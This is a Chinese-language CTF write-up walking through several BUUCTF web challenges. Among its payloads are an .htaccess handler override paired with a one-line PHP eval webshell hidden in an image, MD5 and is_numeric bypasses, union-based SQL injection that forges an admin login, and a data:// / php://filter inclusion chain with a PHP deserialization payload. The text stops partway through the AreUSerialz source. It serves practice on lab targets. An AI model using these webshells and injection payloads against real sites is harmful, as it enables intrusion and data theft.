<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>开启靶机，是一个文件上传的界面。<br><code>1、首先常规测试。</code><br>直接上传php文件，发现直接被检测到拦截，尝试常规的思路进行绕过，都被打道回府。<br><img src="https://pic.imgdb.cn/item/6564070bc458853aef101b70.jpg"><br><img src="https://pic.imgdb.cn/item/65640718c458853aef103978.jpg"><br><code>2、配置文件.htaccess绕</code><br>那么这里就可以上传一个配置文件，以.htaccess命名，内容为：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;shell.png&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传一个.htaccess文件,这个.htaccess文件的作用就是把这个图片文件解析成php代码执行。<br>直接上传即可，注意，MIME值要抓包修改。<br><img src="https://pic.imgdb.cn/item/6564072ac458853aef1061db.jpg"><br>成功上传。<br><code>3、然后上传一个图片马</code><br>内容是</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_REQUEST[shell]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">//不使用</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">eva</span>(<span class="variable">$_REQUEST</span>[shell])<span class="meta">?&gt;</span></span><span class="language-xml">，因为防一手检测。</span></span><br></pre></td></tr></table></figure>
<p>随后直接上传，成功。<br><img src="https://pic.imgdb.cn/item/6564075fc458853aef10e0a2.jpg"><br><code>4、webshell管理工具连接</code><br>访问的网址应该是：<br><a target="_blank" rel="noopener" href="http://c95ecc9c-8102-4d9d-ba7d-f558ae384843.node4.buuoj.cn:81/upload/cfdfb305e6a0a106262f15d58e1f6b9a/shell.png">http://c95ecc9c-8102-4d9d-ba7d-f558ae384843.node4.buuoj.cn:81/upload/cfdfb305e6a0a106262f15d58e1f6b9a/shell.png</a><br>即去掉&#x2F;var&#x2F;www&#x2F;html&#x2F;<br>成功找到flag<br><img src="https://pic.imgdb.cn/item/6564076ac458853aef10fc72.jpg"></p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><code>关键</code>：1、MD5绕过<br>      2、is_numeric()绕过<br>开启靶机，直接查看源码即可。<br><img src="https://pic.imgdb.cn/item/65642debc458853aef79ccdc.jpg"><br><code>2、代码审计</code><br>简而言之就两处比较重要：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>)</span><br></pre></td></tr></table></figure>
<p> 注意这里是&#x3D;&#x3D;&#x3D;强等于，可以将参数设置为数组进行绕过；<code>如果是双等号弱等于，可以找两个md5加密后开头都是0e（这样就会被认为是科学计数法）的参数进行绕过</code><br>第一处：<br>在网址栏填入?id[]&#x3D;1&amp;gg[]&#x3D;2</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!is_numeric($passwd))</span><br></pre></td></tr></table></figure>
<p>第二处：<br>3种方法绕过。<br>法一数组加16进制绕过：<br>passwd[]&#x3D;12D687（1234567的16进制）<br>法二%00与%20截断：is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。<br>passwd&#x3D;1234567%00（%20也可）<br>法三：passwd&#x3D;1234567a<br>最终：post提交：passwd&#x3D;1234567%20<br><code>3、斩</code><br>根据上述分析，最终填入<br><img src="https://pic.imgdb.cn/item/65642df7c458853aef79f50b.jpg"><br>直接爆出flag。<br><code>参考</code><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50597969/article/details/115492810">https://blog.csdn.net/weixin_50597969/article/details/115492810</a></p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>打开靶机，标准的登录界面。<br><code>首先测试是否存在注入点</code><br>ps：在用户名|密码输入都可，个人习惯在密码框输入。<br>输入1，密码随便输入<br>提示不存在这个用户<br><img src="https://pic.imgdb.cn/item/65694707c458853aefbd63e4.jpg"><br>输入1’，密码随便输入<br>直接报错，说明输入的’带入到数据库查询，存在注入点，且是字符型注入<br><img src="https://pic.imgdb.cn/item/65694720c458853aefbd99e2.jpg"><br><code>接下来尝试万能密码</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>
<p>应该是对or存在过滤，这里双写绕过也行不通，过滤做得挺好的。<br><img src="https://pic.imgdb.cn/item/6569472cc458853aefbdb557.jpg"><br>既然对or存在过滤，那么报错盲注应该也不行。<br><code>然后尝试堆叠注入</code></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span>;<span class="function">show <span class="title">database</span>()</span>;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>但是dabtabse()又被过滤了。<br><code>盲猜</code><br><code>然后我就不断尝试，发现select，union没被过滤</code><br>那我就先爆一下字段数</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6569473bc458853aefbdd55a.jpg"></p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65694751c458853aefbe040d.jpg"><br>那么可以确定字段数为3。<br>测试3个字段时，提示用户不对，那么猜测3个字段中有一个是select username，一个select password。<br>继续测试，看看具体是哪一个，这里有点跳跃，因为我直接猜username是admin。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6569475bc458853aefbe1bda.jpg"><br>测试出第二个字段是username。<br><code>关键-联合注入添加临时用户</code><br><code>利用sqli的特性：当union联合查询不存在的数据时，联合查询就会构造一个虚拟的数据</code><br>那么我在密码输入1<br>那么，payload如下（下面那一长串为1的md5值）<br><img src="https://pic.imgdb.cn/item/65694766c458853aefbe3734.jpg"></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><code>ps：密码的字段靠试，1的位置没有爆出那么就尝试3的位置。</code></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我的理解是：执行以上<span class="keyword">sql</span>语句时，在查询的时候并没有在数据库中匹配到（因为username虽然匹配了，但是<span class="keyword">password</span>仍没有匹配），那么<span class="keyword">union</span>就会创造一个临时的数据，也就在数据库中临时加上了：<span class="string">&#x27;admin&#x27;</span> <span class="string">&#x27;1&#x27;</span>，然后我密码输入<span class="number">1</span>，刚好匹配。</span><br></pre></td></tr></table></figure>
<p>直接爆出flag。<br><code>题外话：当字段在中间时，要用括号括起来，且用select（也就是把新查询的结果当作这段sql语句的第二个字段值显示出来）</code></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&#x27;web&#x27;</span>),<span class="number">3</span><span class="meta">#</span></span><br><span class="line">table_schema!!!</span><br></pre></td></tr></table></figure>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><code>这道题没啥好说的，但给了我一个警示：MIME类型不能仅仅局限于修改为image/png更要眼观六路，不行就换成jpeg的，试完全部才不会遗漏</code></p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>开启靶机，直接是一段php代码。<br>直接代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];		</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;  <span class="comment">// file_get_contents()把 $text 的文件中内容读入一个字符串中。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;		<span class="comment">// 正则过滤 $file 参数中不能有 flag </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php		</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);	<span class="comment">// php 反序列化</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><code>主要是三层过滤</code><br><code>第一层--利用php伪协议data://text/plain绕过</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(isset(<span class="variable">$text</span>)</span></span>&amp;&amp;(<span class="built_in">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))<span class="comment">// file_get_contents()把 $text 的文件中内容读入一个字符串中。</span></span><br></pre></td></tr></table></figure>
<p>file_get_contents($text,’r’)是读取文件的内容，说明我们首先要上传一个文件，并且它的内容还得是”welcome to the zjctf”，我们考虑用data协议，data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中的逗号后面然后让file_get_contents函数取读取。<br>payload</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain,welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf</span><br><span class="line">或</span><br><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain;base64,(welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf)的base64</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/657860c0c458853aef6f7c1b.jpg"><br>成功绕过第一层。<br>ps：其实使用php:&#x2F;&#x2F;input也可以实现绕过</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?<span class="built_in">text</span>=php:<span class="comment">//input</span></span><br><span class="line">xxxx</span><br></pre></td></tr></table></figure>
<p>但是只支持post，这里是get，所以使用data:&#x2F;&#x2F;text&#x2F;plain。<br><code>第二层--利用php://filter先读取关键文件</code><br>由于对flag存在正则过滤，不能直接通过获取flag来拿到结果，不过可以用 php:&#x2F;&#x2F;filter 过滤器来进行绕过，先获取 unseless.php 的文件base64编码后的数据。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;		<span class="regexp">//</span> 正则过滤 <span class="variable">$file</span> 参数中不能有 flag </span><br><span class="line">     echo <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">     <span class="keyword">exit</span>(); </span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     include(<span class="variable">$file</span>);  <span class="regexp">//u</span>seless.php，这里就提示可以使用php:<span class="regexp">//</span>filter读取文件包含的这个文件		</span><br><span class="line">     <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);	<span class="regexp">//</span> php 反序列化</span><br><span class="line">     echo <span class="variable">$password</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="regexp">//</span>text<span class="regexp">/plain,welcome to the zjctf&amp;file=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
<p>base64解码后得到如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p><code>第三层--php反序列化</code><br>我把读取后的代码整合到一起就是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);	<span class="comment">// php 反序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$password</span>;</span><br></pre></td></tr></table></figure>
<p>也就是说，有一个flag.php需要我们使用上述代码的函数进行读取，怎么读取呢？看到反序列化，那可以先序列化。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$flag</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终payload</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain,welcome <span class="keyword">to</span> the zjctf&amp;file=php://<span class="keyword">filter</span>/<span class="keyword">read</span>=convert.base64-encode/resource=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>获取flag。<br><img src="https://pic.imgdb.cn/item/657860cfc458853aef6fcc42.jpg"></p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>直接代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//文件包含flag.php,这里后期看看可不可用使用php://filter读取</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;<span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;<span class="comment">//三个属性</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//创造类时调用，如果没有指定参数，默认使用此处的参数</span></span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;<span class="comment">//判断op的值，为1进入write();为2进入read();</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;<span class="comment">//向某一个目录写入</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;<span class="comment">//读取文件，可以使用php://filter协议读取</span></span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//简单输出</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//析构函数，这里是强比较，容易绕过</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span 